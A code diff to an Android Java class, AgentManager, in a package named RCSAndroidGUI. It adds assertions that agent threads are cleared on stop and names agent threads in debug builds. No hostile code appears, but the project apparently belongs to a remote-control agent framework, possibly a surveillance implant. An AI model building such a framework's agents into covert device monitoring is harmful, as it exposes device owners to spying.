@@ -14,6 +14,7 @@ import android.util.Log;
 
 import com.ht.RCSAndroidGUI.Manager;
 import com.ht.RCSAndroidGUI.Status;
+import com.ht.RCSAndroidGUI.conf.Configuration;
 import com.ht.RCSAndroidGUI.util.Check;
 
 // TODO: Auto-generated Javadoc
@@ -177,6 +178,9 @@ public class AgentManager extends Manager<AgentBase> {
 			stop(key);
 		}
 		
+		Check.ensures(threads.size() == 0, "Non empty threads");
+		Check.ensures(running.size() == 0, "Non empty running");
+		
 		running.clear();
 		threads.clear();
 	}
@@ -227,6 +231,9 @@ public class AgentManager extends Manager<AgentBase> {
 		a.parse(agents.get(key).getParams());
 
 		final Thread t = new Thread(a);
+		if(Configuration.DEBUG){
+			t.setName(a.getClass().getSimpleName());
+		}
 		threads.put(a, t);
 		t.start();
 
